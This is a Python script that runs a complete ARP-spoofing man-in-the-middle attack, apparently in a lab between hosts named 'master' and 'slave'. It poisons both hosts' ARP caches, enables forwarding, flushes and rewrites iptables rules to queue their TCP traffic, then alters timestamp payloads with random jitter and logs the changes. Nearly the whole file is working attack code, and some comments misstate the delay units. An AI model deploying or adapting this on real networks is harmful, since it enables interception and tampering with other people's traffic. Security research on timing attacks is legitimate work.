from scapy.all import *
from netfilterqueue import NetfilterQueue
import numpy as np
from datetime import datetime
import random
import logging
import os
import socket
import subprocess
import time
import csv

np.random.seed(123)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def get_ip_address(hostname):
    try:
        ip_add = socket.gethostbyname(hostname)
        return ip_add
    except socket.gaierror:
        logging.error(f"Could not resolve hostname: {hostname}")
        return None

SENDER_NAME = os.environ.get('SENDER_NAME', 'master')
RECEIVER_NAME = os.environ.get('RECEIVER_NAME', 'slave')

SENDER_IP = get_ip_address(SENDER_NAME)
RECEIVER_IP = get_ip_address(RECEIVER_NAME)
ATTACKER_MAC = "02:42:ac:11:00:02"

print(f"SENDER_NAME: {SENDER_NAME}, SENDER_IP: {SENDER_IP}")
print(f"RECEIVER_NAME: {RECEIVER_NAME}, RECEIVER_IP: {RECEIVER_IP}")
if not SENDER_IP or not RECEIVER_IP or not ATTACKER_MAC:
    logging.error("Failed to resolve IP addresses or get MAC address. Exiting.")
    exit(1)

DATA_POINTS_PER_SESSION = 290  
processed_data_points = 0 
modified_data_points = 0   

# Attack parameters
fixed_delay = 1e-3  # 1 nanosecond initial delay
jitter_std = 1e-11  # 10 picoseconds standard deviation for jitter
ramp_factor = 1.0001  # 0.01% increase in delay per timestamp

def arp_spoof(master_ip, slave_ip, attacker_mac):
    master_mac = getmacbyip(master_ip)
    slave_mac = getmacbyip(slave_ip)
    
    fake_master = ARP(op=2, pdst=master_ip, hwdst=master_mac, psrc=slave_ip, hwsrc=attacker_mac)
    fake_slave = ARP(op=2, pdst=slave_ip, hwdst=slave_mac, psrc=master_ip, hwsrc=attacker_mac)
    
    while True:
        send(fake_master, verbose=False)
        send(fake_slave, verbose=False)
        time.sleep(10)

DATA_DIR = '/data'
os.makedirs(DATA_DIR, exist_ok=True)

def save_modified_data(modified_data):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"modified_data_session_{timestamp}.csv"
    filepath = os.path.join(DATA_DIR, filename)
    with open(filepath, 'w', newline='') as csvfile:
        csv_writer = csv.writer(csvfile)
        csv_writer.writerow(["Modified Data"])
        for data_point in modified_data:
            print("data points:")
            print(data_point)
            csv_writer.writerow([data_point])
    logging.info(f"Modified data saved to {filename}")

def delay_attack(payload, fixed_delay, jitter_std, ramp_factor):
    global modified_data_points, processed_data_points
    print("payload:")
    print(payload)
    timestamps = payload.decode().strip().split('\n')
    current_delay = 0
    modified_data = []
    
    for timestamp in timestamps:
        if timestamp:  
            try:
                original_time = float(timestamp)
                # current_delay = fixed_delay * (ramp_factor ** i)
                jitter = np.random.normal(0, jitter_std)
                attacked_time = original_time + jitter
                modified_data_points += 1
                processed_data_points += 1
                modified_data.append(attacked_time)
                yield f"{attacked_time:.9f}".encode()
            except ValueError:
                yield timestamp.encode()
    print("modified data points:")
    print(modified_data)
    save_modified_data(modified_data)

def packet_callback(pkt):
    global modified_data_points, processed_data_points
    scapy_pkt = IP(pkt.get_payload())
    
    if scapy_pkt.haslayer(IP) and scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw):
        src_ip = scapy_pkt[IP].src
        dst_ip = scapy_pkt[IP].dst
        
        if src_ip == SENDER_IP and dst_ip == RECEIVER_IP:
            payload = scapy_pkt[Raw].load
            modified_payload = b'\n'.join(delay_attack(payload, fixed_delay, jitter_std, ramp_factor))
            scapy_pkt[Raw].load = modified_payload
            
            # Update packet length
            scapy_pkt[IP].len = len(scapy_pkt)
            scapy_pkt[TCP].len = len(scapy_pkt[TCP])
            
            # Delete checksums to force recalculation
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum
            
            pkt.set_payload(bytes(scapy_pkt))
            logging.info(f"Modified packet from {src_ip} to {dst_ip}. Total modified data points: {modified_data_points}")
       
    pkt.accept()
    # return True  # Continue processing packets

def mitm_attack():
    global modified_data_points, processed_data_points
    # arp_spoof(SENDER_IP, RECEIVER_IP, ATTACKER_MAC)
    try:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        # Start ARP spoofing in a separate thread
        import threading
        arp_thread = threading.Thread(target=arp_spoof, args=(SENDER_IP, RECEIVER_IP, ATTACKER_MAC), daemon=True)
        arp_thread.start()
        
        logging.info("ARP spoofing started. Waiting for 5 seconds before capturing packets...")
        
        time.sleep(5)  # Wait for ARP spoofing to take effect
        
        os.system("iptables -F")  # Flush existing rules
        os.system(f"iptables -A FORWARD -p tcp -s {SENDER_IP} -d {RECEIVER_IP} -j NFQUEUE --queue-num 0")
        os.system(f"iptables -A FORWARD -p tcp -s {RECEIVER_IP} -d {SENDER_IP} -j NFQUEUE --queue-num 0")
        
        nfqueue = NetfilterQueue()
        nfqueue.bind(0, packet_callback)

        logging.info("Starting packet interception...")
        nfqueue.run()
        
    except KeyboardInterrupt:
        logging.info("Stopping packet interception...")
    except Exception as e:
        logging.error(f"MITM attack error: {e}")
    finally:
        nfqueue.unbind()
        os.system("iptables -F")
        logging.info(f"MITM attack stopped for this session. Total modified data points: {modified_data_points}")

if __name__ == "__main__":
    while True: 
        modified_data_points = 0
        processed_data_points = 0
        mitm_attack()
        time.sleep(1)






